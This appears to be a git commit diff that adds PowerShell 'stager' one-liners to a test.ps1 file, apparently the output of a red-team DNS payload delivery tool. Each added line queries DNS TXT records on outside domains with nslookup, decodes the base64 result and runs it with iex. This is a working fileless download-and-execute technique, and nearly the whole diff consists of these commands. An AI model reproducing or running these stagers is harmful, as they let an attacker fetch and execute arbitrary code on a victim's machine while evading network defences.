2ea28894653fce48cdd1117e0789dff1a33ce2b7
Mantvydas Baranauskas <mantvydo@gmail.com>
2019-02-06 23:01:52 +0000

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -5,3 +5,14 @@ e64String(($b64 -replace('\t|"',"")))))
 [*] Stager using authoritative NS server:
 $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.ired.team" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString([S
 ystem.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
+
+
+
+[*] Stager using non-authoritative NS server (copied to clipboard):
+$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.nodspot.com")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromB
+ase64String(($b64 -replace('\t|"',"")))))
+
+[*] Stager using authoritative NS server:
+$b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.nodspot.com" greg.ns.cloudflare.com)[-1] }; iex([System.Text.Encoding]::ASCII.GetString(
+[System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
+PS C:\tools\powercloud>
